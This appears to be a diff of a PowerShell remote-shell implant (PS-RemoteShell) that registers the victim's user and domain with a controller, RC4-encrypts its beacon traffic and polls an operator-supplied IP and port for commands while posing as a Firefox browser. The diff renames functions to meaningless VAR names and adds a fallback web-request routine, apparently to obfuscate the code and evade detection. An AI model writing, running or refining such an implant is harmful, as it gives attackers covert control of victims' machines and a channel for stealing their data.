@@ -1,4 +1,4 @@
-function Get-UserInfo {
+function VAR50 {
     
     PROCESS {
         if( -not (Test-Path env:userdomain)) {
@@ -23,7 +23,7 @@ function Get-UserInfo {
     }
 }
 
-function Random-String {
+function VAR51 {
     [CmdletBinding()]
     Param (
         [Parameter(Position = 1, Mandatory = $True)]
@@ -41,7 +41,7 @@ function Random-String {
     }
 }
 
-function Crypto-RC4 {
+function VAR52 {
     [CmdletBinding()]
     Param (
         [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
@@ -71,7 +71,7 @@ function Crypto-RC4 {
     }
 }
 
-function RC4-DecodeBase64 {
+function VAR53 {
     [CmdletBinding()]
     Param (
     [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
@@ -82,12 +82,12 @@ function RC4-DecodeBase64 {
     
     PROCESS {
         $VAR11 = [Convert]::FromBase64String($Buffer)
-        $VAR12 = ($VAR11 | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($Key)))
+        $VAR12 = ($VAR11 | VAR52 -Key ([Text.Encoding]::ASCII.GetBytes($Key)))
         return [Text.Encoding]::ASCII.GetString($VAR12)
     }
 }
 
-function RC4-EncodeBase64 {
+function VAR54 {
     [CmdletBinding()]
     Param (
     [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
@@ -98,9 +98,49 @@ function RC4-EncodeBase64 {
     
     PROCESS {
         $VAR13 = [Text.Encoding]::ASCII.GetBytes($Buffer)
-        $VAR14 = ($VAR13 | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($Key)))
+        $VAR14 = ($VAR13 | VAR52 -Key ([Text.Encoding]::ASCII.GetBytes($Key)))
         return [Convert]::ToBase64String($VAR14)
     }
+}
+
+function VAR55 {
+    [CmdletBinding()]
+    Param (
+        [Parameter(Mandatory=$True)]
+        [string]$Url,
+        [Parameter(Mandatory=$True)]
+        [string]$Data
+	)
+	
+	PROCESS {
+		$VAR30 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
+		$VAR31 = ""
+		if(Get-Command Invoke-WebRequest -errorAction SilentlyContinue) {
+			$VAR31 = Invoke-WebRequest -Uri $Url -Method POST -Body $Data -UserAgent $VAR30 -TimeoutSec 10 -UseBasicParsing       
+		} else {
+			$VAR32 = [System.Net.WebRequest]::Create($Url)
+			$VAR32.Method = "POST"
+			$VAR32.UserAgent = $VAR30
+			$VAR32.Timeout = 10000
+			$VAR32.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+			try {
+				$VAR33 = $VAR32.GetRequestStream()
+				$VAR34 = New-Object System.IO.StreamWriter($VAR33)
+				$VAR34.Write($Data)
+			} finally {
+				if($null -ne $VAR34) { 
+					$VAR34.Dispose() 
+				}
+				if($null -ne $VAR33) {
+					$VAR33.Dispose() 
+				}
+			 }
+			$VAR35 = $VAR32.GetResponse().getResponseStream()
+			$VAR36 = New-Object System.IO.StreamReader($VAR35)
+			$VAR31 = $VAR36.ReadToEnd()
+		}
+		return $VAR31
+	}
 }
 
 function PS-RemoteShell { 
@@ -131,13 +171,13 @@ function PS-RemoteShell {
 
     PROCESS {
         $VAR17 = $False
-        $VAR18 = Random-String -Length 16
-        $VAR19 = Get-UserInfo
+        $VAR18 = VAR51 -Length 16
+        $VAR19 = VAR50
         $VAR21 = "register $($VAR18) $($VAR19)"
         (New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
         
         While($VAR17 -ne $True) {
-          $VAR22 = Random-String -Length $(Get-Random -Minimum 5 -Maximum 16)
+          $VAR22 = VAR51 -Length $(Get-Random -Minimum 5 -Maximum 16)
             if ($Protocol -eq "https") {
                 $VAR20 = @"
                     using System.Net;
@@ -159,10 +199,10 @@ function PS-RemoteShell {
             $VAR23 = ""
             Start-Sleep -m $Delay
             $Url = "$($Protocol)://$($Ip):$($Port)/$($VAR22)?$($VAR18)"
-            $VAR21 = RC4-EncodeBase64 -Buffer $VAR21 -Key $Key
+            $VAR21 = VAR54 -Buffer $VAR21 -Key $Key
             Try {
-                $VAR24 = Invoke-WebRequest -Uri $Url -Method POST -Body $VAR21 -UserAgent "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" -TimeoutSec 10 -UseBasicParsing
-                $VAR23 = RC4-DecodeBase64 -Buffer $VAR24 -Key $Key
+                $VAR24 = VAR55 -Url $Url -Data $VAR21
+                $VAR23 = VAR53 -Buffer $VAR24 -Key $Key
             } Catch {
                 $VAR23 = ""
                 $error.Clear()
@@ -180,7 +220,7 @@ function PS-RemoteShell {
             
             if($VAR26 -eq "" -And $VAR27 -eq "") {
                 $VAR28 = Get-Random -Maximum 50 -Minimum 1
-                $VAR29 = Random-String -Length $VAR28
+                $VAR29 = VAR51 -Length $VAR28
                 $VAR26 = "hello $($VAR29)"
             }
             
